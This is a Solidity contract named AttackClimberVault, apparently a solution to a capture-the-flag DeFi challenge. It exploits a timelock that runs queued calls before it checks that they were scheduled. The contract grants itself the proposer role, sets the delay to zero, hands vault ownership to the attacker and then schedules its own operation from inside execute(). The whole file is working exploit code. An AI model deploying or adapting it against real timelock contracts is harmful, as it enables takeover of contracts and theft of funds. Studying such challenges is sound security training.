//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";

contract AttackClimberVault {
    //address payable private immutable timelock;
    ClimberTimelock private immutable climberTimelock;

    //parameters to pass to Timelock
    uint256[] private _values = [0, 0, 0, 0];
    address[] private _targets = new address[](4);
    bytes[] private _elements = new bytes[](4);

    constructor(address payable _timelock, address _vault) {
        climberTimelock = ClimberTimelock(_timelock);
        _targets = [_timelock, _vault, _timelock, address(this)];

        //These elements will be passed as actions to call
        // from AccessControl: grants PROPOSER_ROLE to our attack contract
        _elements[0] = (
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );
        //from OwnableUpgradeable.sol: call on ClimberVault transfers ownership to attacker contract.
        //This is needed to upgrade the ClimberVault proxy contract
        _elements[1] = abi.encodeWithSignature(
            "transferOwnership(address)",
            msg.sender
        );

        //Update time delay to 0
        _elements[2] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        //A call on Attack contract to execute timelockSchedule() , which will call schedule() of ClimberTimelock
        _elements[3] = abi.encodeWithSignature("timelockSchedule()");
    }

    /**
     * @dev Calls execute on timelock
     */
    function timelockExecute() external {
        climberTimelock.execute(
            _targets,
            _values,
            _elements,
            bytes32("anySalt")
        );
    }

    /**
     * @dev Calls schedule on timelock
     */
    function timelockSchedule() external {
        climberTimelock.schedule(
            _targets,
            _values,
            _elements,
            bytes32("anySalt")
        );
    }
}
